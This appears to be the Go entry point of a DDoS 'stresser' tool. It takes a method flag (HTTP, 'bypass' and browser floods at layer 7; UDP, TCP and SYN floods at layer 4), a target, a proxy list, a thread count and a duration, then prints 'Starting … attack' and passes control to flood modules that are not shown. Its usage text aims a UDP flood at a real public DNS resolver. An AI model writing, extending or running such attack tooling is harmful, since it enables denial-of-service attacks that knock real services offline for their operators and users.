package main

import (
	"flag"
	"fmt"
	"os"
	"stresser/internal/l4"
	"stresser/internal/l7"
)

func main() {
	method := flag.String("m", "", "Method: http,https,bypass,browser (L7) | udp,tcp,syn,flood (L4)")
	target := flag.String("t", "", "Target: URL for L7, IP:port for L4")
	proxyFile := flag.String("p", "proxies.txt", "Proxy list file (for L7 only)")
	threads := flag.Int("th", 300, "Number of threads")
	duration := flag.Int("d", 60, "Duration in seconds")

	flag.Parse()

	if *method == "" || *target == "" {
		fmt.Println("Usage:")
		fmt.Println("  L7: ./stresser -m http -t https://target.com -p proxies.txt -th 500 -d 30")
		fmt.Println("  L4: ./stresser -m udp -t 1.1.1.1:53 -th 400 -d 20")
		fmt.Println("\nMethods:")
		fmt.Println("  L7: http, https, bypass, browser")
		fmt.Println("  L4: udp, tcp, syn, flood")
		os.Exit(1)
	}

	fmt.Printf("[+] Starting %s attack on %s | Threads: %d | Time: %ds\n", *method, *target, *threads, *duration)

	switch *method {
	case "http", "https", "bypass", "browser":
		l7.Run(*method, *target, *proxyFile, *threads, *duration)
	case "udp", "tcp", "syn", "flood":
		l4.Run(*method, *target, *threads, *duration)
	default:
		fmt.Println("[-] Unknown method. Use L7 or L4 methods only.")
	}
}
